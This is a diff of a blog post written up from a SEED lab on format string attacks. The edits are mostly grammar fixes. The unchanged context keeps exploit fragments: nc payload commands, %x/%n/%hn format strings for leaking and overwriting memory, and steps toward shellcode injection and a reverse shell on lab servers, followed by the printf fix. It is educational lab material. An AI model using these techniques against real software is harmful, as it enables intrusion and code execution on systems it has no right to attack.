@@ -1,18 +1,17 @@
 ---
 layout: post
 title: Format String Attack
-excerpt:
+excerpt: A format string is a string that contains special format specifiers that act as placeholders for data. These format specifiers define how data should be displayed when it is substituted into the string.In the C programming language, functions such as `printf()`, `sprintf()`, `fprintf()`, and `scanf()` can be used with format strings. Exploiting a format string vulnerability can lead to various consequences, such as leaking sensitive information, altering the program state, crashing the program, or even executing arbitrary code. The impact of the attack depends on the specific vulnerability and the attacker's objectives.
 description: [code injection]
 ---
 
 A format string is a string that contains special format specifiers that act as placeholders for data. These format specifiers define how data should be displayed when it is substituted into the string.
 
-In C programming language, functions such as `printf()`, `sprintf()`, `fprintf()`, and `scanf()` can be used with format strings. The issue with format strings arise when programs allow users to provide the entire or part of the contents in a format string and such inputs are not sanitized. Malicious users can use the opportunity to get
-the program to run arbitrary code.
+In the C programming language, functions such as `printf()`, `sprintf()`, `fprintf()`, and `scanf()` can be used with format strings. The issue with format strings arises when programs allow users to provide the entire or part of the contents in a format string, and such inputs are not sanitized. Malicious users can use the opportunity to get the program to run arbitrary code.
 
-The basic idea behind a format string attack is that an attacker can include additional format specifiers in the format string to access data or execute code that they should not have access to. For example, an attacker can use the %x specifier to read values from the stack, or %n to write to arbitrary memory locations.
+The basic idea behind a format string attack is that an attacker can include additional format specifiers in the format string to access data or execute code that they should not have access to. For example, an attacker can use the %x specifier to read values from the stack or %n to write to arbitrary memory locations.
 
-Exploiting a format string vulnerability can lead to various consequences, such as leaking sensitive information, altering program state, crashing the program, or even executing arbitrary code. The impact of the attack depends on the specific vulnerability and the attacker's objectives.
+Exploiting a format string vulnerability can lead to various consequences, such as leaking sensitive information, altering the program state, crashing the program, or even executing arbitrary code. The impact of the attack depends on the specific vulnerability and the attacker's objectives.
 
 In this post, I aim to document my findings and observations while performing a SEED lab.
 
@@ -30,9 +29,9 @@ The server program is compiled such that the stack is executable.
 ```
 Server details
 ```
-The server hosting the 32-bit vulnerable program is at 10.9.0.5
-The server hosting the 64-bit vulnerable program is at 10.9.0.6
-The servers listens to port 9090 and invoke the appropriate vulnerable program when it receives a TCP connection.
+The server hosting the 32-bit vulnerable program is at 10.9.0.5.
+The server hosting the 64-bit vulnerable program is at 10.9.0.6.
+The servers listen to port 9090 and invoke the appropriate vulnerable program when it receives a TCP connection.
 ```
 </div></details>
 
@@ -135,9 +134,9 @@ void dummy_function(char *str)
 
 <br>
 
-###  Crashing the Program
+###  Crashing the Program
 
-This task involves crashing a 32-bit vulnerable program runnning on a remote server. The lab has been designed in such a way that when the vulnerable program runs normally, it prints out some essential values that we would need to practice a format string attack.
+This task involves crashing a 32-bit, vulnerable program running on a remote server. The lab has been designed in such a way that when the vulnerable program runs normally, it prints out some essential values that we would need to practice a format string attack.
 
 So we first send a benign message to the server to get these values.
 ```bash
@@ -146,9 +145,10 @@ echo hello | nc -w5 10.9.0.5 9090
 
 **image**
 
-When a program uses format string, the function using the format string takes it values from the stack.
+When a program uses a format string, the function using the format string takes its values from the stack.
 
-Take for example, a program that uses the below format string:
+Take, for example, a program that uses the below format string:
+
 ```c
 #include <stdio.h>
 
@@ -158,9 +158,11 @@ int main() {
   printf("My name is %s and I am from planet %s", name, planet);
 }
 ```
-When the stack is built, the optional arguments (name and planet) are placed right above the format string argument. Based on the number of format specifiers, the program tries to access the memory addresses of these optional arguments. Thus if for any reason the format  specifiers are more than the optional arguments provided, the program will try to read the memory address of an area it has no access to leading to a segmentation fault and crashing the program.
 
-To crash the program, we need to introduce format specifiers so program will try to read the memory address of an area it has no access to leading to a segmentation fault. In this case, one format specifier seems to be enough to crash the program.
+When the stack is built, the optional arguments (name and planet) are placed right above the format string argument. Based on the number of format specifiers, the program tries to access the memory addresses of these optional arguments. Thus, if for any reason the format specifiers are more than the optional arguments provided, the program will try to read the memory address of an area it has no access to, leading to a segmentation fault and crashing the program.
+
+To crash the program, we need to introduce format specifiers so the program will try to read the memory address of an area it has no access to, leading to a segmentation fault. In this case, one format specifier seems to be enough to crash the program.
+
 ```bash
 echo %s | nc -w5 10.9.0.5 9090
 ```
@@ -174,13 +176,13 @@ We can tell that the format program has crashed because it did not print out "Re
 
 ### Printing Out the Server Program’s Memory
 
-The objective of this task is to get the server to print out some data from its memory. 
+The objective of this task is to get the server to print out some data from its memory.
 
 #### Stack Data
 
-When we use the "%x" format specifier, it instructs the program to access a memoey location and print out the hex value of the contents in that memory location. For this task we would need to build our input to the server such that when the values in memory are printed, we can tell the offset from the beginning of the stack.
+When we use the "%x" format specifier, it instructs the program to access a memory location and print out the hex value of the contents in that memory location. For this task, we would need to build our input to the server such that when the values in memory are printed, we can tell the offset from the beginning of the stack.
 
-Thus our input will start with a value we know i.e. AAAA = \x41\x41\x41\x41 and will be made up of an increasing number of "%x" until we are able to see the value \x41\x41\x41\x41 printed out.
+Thus, our input will start with a value we know, i.e., AAAA = \x41\x41\x41\x41, and will be made up of an increasing number of "%x" until we are able to see the value \x41\x41\x41\x41 printed out.
 
 ```python
 #!/usr/bin/python3
@@ -209,13 +211,14 @@ cat badfile | nc -w2 10.9.0.5 9090
 
 **image**
 
-After a number of trial and error, I was able to determine that the offset of our input from the beginning of the stack is 64. Thus, it will take 64 `%x` to  print out the first four bytes of my input.
+After a number of trials and errors, I was able to determine that the offset of our input from the beginning of the stack is 64. Thus, it will take 64 `%x` to print out the first four bytes of my input.
 
 #### Heap Data
 
-There is a secret message that is stored on the heap when the program runs. We know that the memory address of this secret message on the heap is `0x080b4008`. In order to print out the value stored in this memory address, we will use `0x080b4008` as the first value in our input, pad it with 63 `%x` so that our program will not crash, then print out the secret message with `%s` to complete the offset.
+There is a secret message that is stored on the heap when the program runs. We know that the memory address of this secret message on the heap is `0x080b4008`. In order to print out the value stored in this memory address, we will use `0x080b4008` as the first value in our input, pad it with 63 `%x` so that our program will not crash, and then print out the secret message with `%s` to complete the offset.
 
-Our initial code will be modified to achieve this
+Our initial code will be modified to achieve this.
+
 ```python
 #!/usr/bin/python3
 import sys
@@ -251,14 +254,14 @@ cat badfile | nc -w2 10.9.0.5 9090
 
 ### Modifying the Server Program’s Memory
 
-The objective of this task is to modify the value of the target variable that is defined in the server program. If this target variable holds an important value that can affect the control flow of the program; attackers can change the behavior of the program if they can modify this value.
+The objective of this task is to modify the value of the target variable that is defined in the server program. If this target variable holds an important value that can affect the control flow of the program, attackers can change the behavior of the program if they can modify this value.
 We know that the memory address of the target variable is `0x080e5068`
 
-#### Changing the value to a different value.
+#### Changing the value to a different value
 
-This task involves changing the content of the target variable to any value different from the original. The `%n` format specifier writes the number f characters that have been printed by printf() before its occurrence into an meemory address (This memory address corresponds to the corresponding argument for %n%).
+This task involves changing the content of the target variable to any value different from the original. The `%n` format specifier writes the number of characters that have been printed by printf() before its occurrence into a memory address (this memory address corresponds to the corresponding argument for %n%).
 
-Since we know that our offset is 64, will need to write our code in such a way that the program will print out characters up to offset 63, then use `%n%` at offset 64 to modify the value stored in the memory address of the target variable we provided as the start of our input.
+Since we know that our offset is 64, we will need to write our code in such a way that the program will print out characters up to offset 63, then use `%n%` at offset 64 to modify the value stored in the memory address of the target variable we provided as the start of our input.
 
 ```python
 #!/usr/bin/python3
@@ -292,7 +295,7 @@ cat badfile | nc -w2 10.9.0.5 9090
 
 #### Changing the value to 0x5000.
 
-This task involves changing the content of the target variable to a "0x5000" rather than a random variable. This is more tricky than the previous task because we need to print out `0x5000 = 20480` characters. We can use precision modifiers (It pads the didgits with zeros to achieve the desired width) which control the minimum number of digits to print to achieve this. Ususally, multiple format specifiers with different precision modifiers will have to be used.
+This task involves changing the content of the target variable to "0x5000" rather than a random variable. This is more tricky than the previous task because we need to print out `0x5000 = 20480` characters. We can use precision modifiers (which pad the didgits with zeros to achieve the desired width), which control the minimum number of digits to print to achieve this. Typically, multiple format specifiers with different precision modifiers will have to be used.
 
 For this task, I need to determine the total number of characters I would need to print for each precision modifier.
 - 0x5000 = 20480
@@ -342,7 +345,7 @@ cat badfile | nc -w2 10.9.0.5 9090
 
 #### Changing the value to 0xAABBCCDD.
 
-In this task, the target value is a large number. This value is the total number of characters that are printed out by the printf() function; printing out this large number of characters may take hours. A faster approach is to use %hn or %hhn, instead of %n, so we can modify a two-byte (or one-byte) memory space, instead of four bytes.
+In this task, the target value is a large number. This value is the total number of characters that are printed out by the printf() function. Printing out this large number of characters may take hours. A faster approach is to use %hn or %hhn instead of %n, so we can modify a two-byte (or one-byte) memory space instead of four bytes.
 
 ##### Using %hn
 
@@ -352,23 +355,23 @@ Our program is a 32-bit program so our address is a 4-byte address. Our machine 
 - 0x080e5068 => 0xCCDD
 - 0x080e506a => 0xAABB
 
-The values written are cummulative, so when constructing our string, we have to start with the addresses that will store lower values.
+The values written are cumulative, so when constructing our string, we have to start with the addresses that will store lower values.
 
 For this task, I need to determine the total number of characters I would need to print for each precision modifier.
 - 0xAABB = 43707
 - 0xCCDD = 52445
-- The offset is 64, and will contain multiple format specifiers:
+- The offset is 64 and will contain multiple format specifiers:
   - we need one for the %hn% format specifier for the first address
   - we need one for the %x modulo precision modifier for the first address
   - we need 64 - 2 for the %x whole number precision modifier for the first address
-- The string will start with the address that will contain a lower value, appended by 4-bytes of random data to account for the %x specifier that will be used for the second address and finally the address that will contain a higher value. This is a total of 12-bytes.
-- The first address will store a lower value which is 0xAABB (43707). The first 12 bytes are where I would store the target variable's addresses.
+- The string will start with the address that will contain a lower value, be appended by 4 bytes of random data to account for the %x specifier that will be used for the second address, and finally the address that will contain a higher value. This is a total of 12 bytes.
+- The first address will store a lower value, which is 0xAABB (43707). The first 12 bytes are where I would store the target variable's addresses.
   - 43707 - 12 = 43695
 - The whole number %x precision modifier for the first address is:
   - 43695 // 62 = 704
 - The modulo number %x precision modifier for the first address is:
   - 43695 % 62 = 47
-- The second address will store a higher value which is 0xCCDD (52445). To determine the number of %x precision modifiers to use, we would subtract 0xAABB form 0xCCCC:
+- The second address will store a higher value, which is 0xCCDD (52445). To determine the number of %x precision modifiers to use, we would subtract 0xAABB from 0xCCCC:
   - 0xCCDD - 0xAABB = 52445 - 43707 = 8738
 
 ```python
@@ -410,7 +413,7 @@ cat badfile | nc -w2 10.9.0.5 9090
 
 ___
 
-Rather than using so may %x in our attack, we can make use of just one to build up the number we want to write into a memory address and use a modifier (K$) to move the pointer to the Kth element we want to write into.
+Rather than using so many %x in our attack, we can make use of just one to build up the number we want to write into a memory address and use a modifier (K$) to move the pointer to the Kth element we want to write into.
 
 The above code can be modified as below to achieve this:
 
@@ -447,13 +450,13 @@ As we can see, the result is the same.
 
 While %n treats the argument provided as a 4-byte integer, %hhn treats the argument as a 1-byte integer, overwriting the least significant byte of the argument. We are going to place `0xAABBCCDD` into memory address `0x080e5068` one byte at a time.
 
-Our program is a 32-bit program so our address is a 4-byte address. Our machine is little-endian, so we break `0xAABBCCDD` into four parts with one byte each.
+Our program is a 32-bit program, so our address is a 4-byte address. Our machine is little-endian, so we break `0xAABBCCDD` into four parts with one byte each.
 - 0x080e5068 => 0xDD
 - 0x080e5069 => 0xCC
 - 0x080e506a => 0xBB
 - 0x080e506b => 0xAA
 
-The values written are cummulative, so when constructing our string, we have to start with the addresses that will store lower values.
+The values written are cumulative, so when constructing our string, we have to start with the addresses that will store lower values.
 
 For this task, I need to determine the total number of characters I would need to print for each precision modifier.
 - 0xAA = 170
@@ -464,28 +467,28 @@ For this task, I need to determine the total number of characters I would need t
   - we need one for the %hhn% format specifier for the first address
   - we need one for the %x modulo precision modifier for the first address
   - we need 64 - 2 for the %x whole number precision modifier for the first address
-- The string will be built as: lower value address +  4-bytes of random data to account for the %x specifier that will be used for the second address + next higher value address + 4-bytes of random data to account for the %x specifier that will be used for the third address + next higher value address + 4-bytes of random data to account for the %x specifier that will be used for the fouth address + the highest value address. This is a total of 28-bytes.
+- The string will be built as: lower value address +  4 bytes of random data to account for the %x specifier that will be used for the second address + next higher value address + 4 bytes of random data to account for the %x specifier that will be used for the third address + next higher value address + 4 bytes of random data to account for the %x specifier that will be used for the fouth address + the highest value address. This is a total of 28 bytes.
 - The first address will store a lower value which is 0xAA (170). The first 28 bytes are where I would store the target variable's addresses.
   - 170 - 28 = 142
 - The whole number %x precision modifier for the first address is:
   - 142 // 62 = 2
 - The modulo number %x precision modifier for the first address is:
   - 142 % 62 = 18
-- The second address will store a higher value which is 0xBB.
+- The second address will store a higher value, which is 0xBB.
   - 0xBB - 0xAA = 17
-- The third address will store a higher value which is 0xCC.
+- The third address will store a higher value, which is 0xCC.
   - 0xCC - 0xBB = 17
-- The last address will store a higher value which is 0xDD.
+- The last address will store a higher value, which is 0xDD.
   - 0xDD - 0xCC = 17
 
 <details>
 <summary>notes</summary>
 <div markdown="1">
 
-For some reasons not yet known to me, putting the value of 170 in 0x080e506b does not produce the intended outcome which is 0xaa. I find that I have to increase the value I put in 0x080e506b. 
-After some tinkering, I was able to determine that putting the value of 285 in 0x080e506b produces 0xaa. Every other thing works as expected.
+For some reasons not yet known to me, putting the value of 170 in 0x080e506b does not produce the intended outcome, which is 0xaa. I find that I have to increase the value I put in 0x080e506b.
+After some tinkering, I was able to determine that putting the value of 285 in 0x080e506b produces 0xaa. Everything else works as expected.
 
-I am yet to determine why this happens.
+I have yet to determine why this happens.
 </div></details>
 
 
@@ -549,7 +552,7 @@ cat badfile | nc -w2 10.9.0.5 9090
 
 ### Inject Malicious Code into the Server Program
 
-This task involves injecting a piece of malicious code, in its binary format, into the server’s memory, and then use the format string vulnerability
+This task involves injecting a piece of malicious code, in its binary format, into the server’s memory and then using the format string vulnerability.
 to modify the return address field of a function, so when the function returns, it jumps to our injected code.
 
 In order to inject malicious code into the server program, we would need to modify the value that is stored in the return address of the function we are exploiting. This lab has been designed in such a way that when the program runs, it prints out certain values for the student.
@@ -659,7 +662,7 @@ cat badfile | nc -w2 10.9.0.5 9090
 # shellcode address = 0xffffd260 + 0x212 = 0xffffd472
 ```
 
-I write out the addresses I would be needing for easy reference
+I write out the addresses I will need for easy reference.
 
 ```python
 content = (0xffffd18c).to_bytes(4,byteorder='little')
@@ -686,7 +689,7 @@ Since the size of the payload before the shellcode is added is yet to be determi
 #print(f"size of content before shellcode = {len(content)}")    # 530 = 0x212
 ```
 
-I use this block of code to initially print the offset form the start of the payload where the shellcode will reside in memory. After running the program, I get a value of 513. I can now do the following:
+I use this block of code to initially print the offset from the start of the payload, where the shellcode will reside in memory. After running the program, I got a value of 513. I can now do the following:
 - determine the shellcode address by adding the offset to the buffer address.
 - use the calculated address to build the format specifiers
 
@@ -694,9 +697,9 @@ I use this block of code to initially print the offset form the start of the pay
 
 #### Getting a Reverse Shell
 
-Getting a shell is more interesting than running arbritrary commands. The goal of this task is to get a shell on the target server, so we can type any command we want. 
+Getting a shell is more interesting than running arbitrary commands. The goal of this task is to get a shell on the target server, so we can type any command we want.
 
-To achieve this all that needs to be edited is the command argument of the bash command in the shell code.
+To achieve this, all that needs to be edited is the command argument of the bash command in the shell code.
 
 ```python
 #!/usr/bin/python3
@@ -739,7 +742,7 @@ cat badfile | nc -w2 10.9.0.5 9090
 
 ### Attacking the 64-bit Server Program
 
-Attacking a 64-bit server is tricky because the memory address is 8-bytes with zeros in the address. Only the address from 0x00 through 0x00007FFFFFFFFFFF is allowed and every 64-bit address has the highest two bytes as zeros. This causes a problem as when `printf()` parses the format string, it will stop the parsing when it sees a zero. 
+Attacking a 64-bit server is tricky because the memory address is 8 bytes with zeros in it. Only the address from 0x00 through 0x00007FFFFFFFFFFF is allowed, and every 64-bit address has the highest two bytes as zeros. This causes a problem, as when `printf()` parses the format string, it will stop the parsing when it sees a zero.
 
 We know that zeros will terminate copying to memory if strpcy() is used, but the vulnerable program does not make use of strcpy(). This means we can have zeros in our input, but because of the `printf()`, we will have to place them where they cannot interrupt `printf()` parsing the format string.
 
@@ -748,9 +751,9 @@ A method I have taken to solve this problem is to place the 64-bit addresses aft
 
 #### Printing Out Stack Data
 
-When we use the "%x" format specifier, it instructs the program to access a memory location and print out the hex value of the contents in that memory location. For this task we would need to build our input to the server such that when the values in memory are printed, we can tell the offset from the beginning of the stack.
+When we use the "%x" format specifier, it instructs the program to access a memory location and print out the hex value of the contents in that memory location. For this task, we would need to build our input to the server such that when the values in memory are printed, we can tell the offset from the beginning of the stack.
 
-Thus our input will start with a value we know i.e. AAAAAAAA = \x41\x41\x41\x41\x41\x41\x41\x41 and will be made up of an increasing number of "%x" until we are able to see the value \x41\x41\x41\x41 printed out.
+Thus, our input will start with a value we know, i.e., AAAAAAAA = \x41\x41\x41\x41\x41\x41\x41\x41, and will be made up of an increasing number of "%x" until we are able to see the value \x41\x41\x41\x41 printed out.
 
 ```python
 #!/usr/bin/python3
@@ -774,7 +777,7 @@ with open('badfile', 'wb') as f:
 
 **image**
 
-After a number of trial and error, I was able to determine that the offset of our input from the beginning of the stack is 34. Thus, it will take 34 %x to print out the first eight bytes of my input.
+After a number of trials and errors, I was able to determine that the offset of our input from the beginning of the stack is 34. Thus, it will take 34 %x to print out the first eight bytes of my input.
 
 
 #### Printing Out Heap Data
@@ -790,7 +793,7 @@ import sys
 secret = 0x0000555555556008
 
 # Start the string with the format specifiers
-# I padded zeros to keep the lenght at 8-bytes
+# I pad zeros to keep the lenght at 8-bytes
 content = ("%00035$s").encode('latin-1')
 
 # Append the address
@@ -811,17 +814,17 @@ with open('badfile', 'wb') as f:
 
 #### Modifying the Target Value to 0xAAAABBBBCCCCDDDD
 
-The objective of this task is to modify the value of the target variable that is defined in the server program. If this target variable holds an important value that can affect the control flow of the program; attackers can change the behavior of the program if they can modify this value. We know that the memory address of the target variable is 0x0000555555558010.
+The objective of this task is to modify the value of the target variable that is defined in the server program. If this target variable holds an important value that can affect the control flow of the program, attackers can change the behavior of the program if they can modify this value. We know that the memory address of the target variable is 0x0000555555558010.
 
-I will be using %hn to modify the target address 2-bytes at a time. I am going to place 0xAAAABBBBCCCCCDDDD into 0x0000555555558010 two bytes at a time
+I will be using %hn to modify the target address, 2 bytes at a time. I am going to place 0xAAAABBBBCCCCCDDDD into 0x0000555555558010, two bytes at a time.
 
-Our program is a 64-bit program so our address is a 8-byte address. Our machine is little-endian, so we break `0xAAAABBBBCCCCCDDDD` into four parts with four bytes each.
+Our program is a 64-bit program, so our address is an 8-byte address. Our machine is little-endian, so we break `0xAAAABBBBCCCCCDDDD` into four parts with four bytes each.
 - 0x0000555555558010   <-- 0xDDDD
 - 0x0000555555558012   <-- 0xCCCC
 - 0x0000555555558014   <-- 0xBBBB
 - 0x0000555555558016   <-- 0xAAAA
 
-The values written are cummulative, so when constructing our string, we have to start with the addresses that will store lower values.
+The values written are cumulative, so when constructing our string, we have to start with the addresses that will store lower values.
 
 For this task, I need to determine the total number of characters I would need to print for each precision modifier.
 - 0xAAAA = 43690
@@ -852,7 +855,7 @@ t3      = 0x0000555555558012    # <-- 0xCCCC
 t4      = 0x0000555555558010    # <-- 0xDDDD
 
 # Create format string
-# I padded zeros to keep the lenght at 16-bytes
+# I pad zeros to keep the lenght at 16-bytes
 content  = ("%.0043690x%42$hn").encode('latin-1')    # <-- 0xAAAA
 content += ("%.0004369x%43$hn").encode('latin-1')    # <-- 0xBBBB
 content += ("%.0004369x%44$hn").encode('latin-1')    # <-- 0xCCCC
@@ -878,7 +881,7 @@ with open('badfile', 'wb') as f:
 
 #### Inject Malicious Code into the Server Program (A reverse shell)
 
-This task involves injecting a piece of malicious code, in its binary format, into the server’s memory, and then use the format string vulnerability to modify the return address field of a function, so when the function returns, it jumps to our injected code - a reverse shell.
+This task involves injecting a piece of malicious code, in its binary format, into the server’s memory and then using the format string vulnerability to modify the return address field of a function, so when the function returns, it jumps to our injected code—a reverse shell.
 
 In order to inject malicious code into the server program, we would need to modify the value that is stored in the return address of the function we are exploiting. This lab has been designed in such a way that when the program runs, it prints out certain values for the student.
 
@@ -952,6 +955,7 @@ r3 = 0x00007fffffffe0d8 + 4     # <-- 0x7fff
 r4 = 0x00007fffffffe0d8 + 6     # <-- 0x0000
 
 # Create format string
+# I pad zeros to keep the lenght at 16-bytes
 content  = ("%.0032767x%40$hn").encode('latin-1')    # <-- 0x7fff
 content += ("%.0025049x%41$hn").encode('latin-1')    # <-- 0xe1d8
 content += ("%.0007719x%42$hn").encode('latin-1')    # <-- 0xffff
@@ -992,7 +996,7 @@ cat badfile | nc -w2 10.9.0.6 9090
 <summary>Code explanation</summary>
 <div markdown="1">
 
-I write out the addresses I would be needing for easy reference. I also map out the shellcode address to the return addresses where they will be stored. Remember our machine is little endian.
+I write out the addresses I will need for easy reference. I also map out the shellcode address to the return addresses where they will be stored. Remember, our machine is little endian.
 
 ```python
 # return address    = 0x00007fffffffe0d8
@@ -1005,7 +1009,7 @@ r3 = 0x00007fffffffe0d8 + 4     # <-- 0x7fff
 r4 = 0x00007fffffffe0d8 + 6     # <-- 0x0000
 ```
 
-I use the below block of code to initially print the offset form the start of the payload where the shellcode will reside in memory. After running the program, I get a value of 72.
+I use the below block of code to initially print the offset from the start of the payload, where the shellcode will reside in memory. After running the program, I got a value of 72.
 
 ```python
 # determine the size of content before adding the shellcode
@@ -1016,7 +1020,7 @@ I can now do the following:
 - determine the shellcode address by adding the offset to the buffer address.
 - use the calculated address to build the format specifiers
 
-I create the format string by starting with the lowest value since the %x is cummulative. 0x7fff is the smallest value, so I atart with this and increment till i have all the required values. I also place them into their respective addresses at the calculated offset.
+I create the format string by starting with the lowest value since the %x is cummulative. 0x7fff is the smallest value, so I start with this and increment till I have all the required values. I also place them into their respective addresses at the calculated offset.
 
 ```python
 # Create format string
@@ -1025,9 +1029,9 @@ content += ("%.0025049x%41$hn").encode('latin-1')    # <-- 0xe1d8
 content += ("%.0007719x%42$hn").encode('latin-1')    # <-- 0xffff
 ```
 
-The initial offset is 34; however, by keeping the format sepcifiers to a constant length of 16-bytes, and knowing I am writing to 3 addresses, the total length of the format specifiers will be 16 * 3 = 48-bytes. But our program is 64-bit meaning each address is 8-bytes. So to get the offset of the first address, we do 34 + (48 / 8) = 34 + 6 = 40
+The initial offset is 34; however, by keeping the format specifiers to a constant length of 16 bytes and knowing I am writing to 3 addresses, the total length of the format specifiers will be 16 * 3 = 48 bytes. But our program is 64-bit, meaning each address is 8 bytes. So to get the offset of the first address, we do 34 + (48 / 8) = 34 + 6 = 40.
 
-The addresses come immediately after the format specifiers and are arranged in a way that the values go into the correct addresses as previously mapped.
+The addresses come immediately after the format specifiers and are arranged in such a way that the values go into the correct addresses as previously mapped.
 
 ```python
 # Append addresses
@@ -1059,11 +1063,11 @@ format.c:44:5: warning: format not a string literal and no format arguments [-Wf
       |     ^~~~~~
 ```
 
-This error message tells us that the argument we are passing to the printf() function is not a string. Rather, we are directly passing a variable to the printf() function. It also brings our attention to the fact that there was no format specifiers included for the printf() to parse.
+This error message tells us that the argument we are passing to the printf() function is not a string. Rather, we are directly passing a variable to the printf() function. It also brings our attention to the fact that there were no format specifiers included for the printf() to parse.
 
 It is important that format specifiers have matching arguments to prevent issues like buffer overflows, memory leaks, or even arbitrary code execution.
 
-To fix this warning and in turn the vulnerability, I would add a string literal with a format specifier that will parse the argument passed to the printf() function. The original code will be modified as below
+To fix this warning and, in turn, the vulnerability, I would add a string literal with a format specifier that will parse the argument passed to the printf() function. The original code will be modified as below:
 
 ```c
 // This line has a format-string vulnerability
@@ -1072,7 +1076,7 @@ To fix this warning and in turn the vulnerability, I would add a string literal 
     printf("%s", msg);
 ```
 
-After making the adjustment, the gcc compiler warning message disappers. All that's left is to relaunch the attacks to find out if they will fail or succeed.
+After making the adjustment, the gcc compiler warning message disappears. All that's left is to relaunch the attacks to find out if they will fail or succeed.
 
 **image**
 
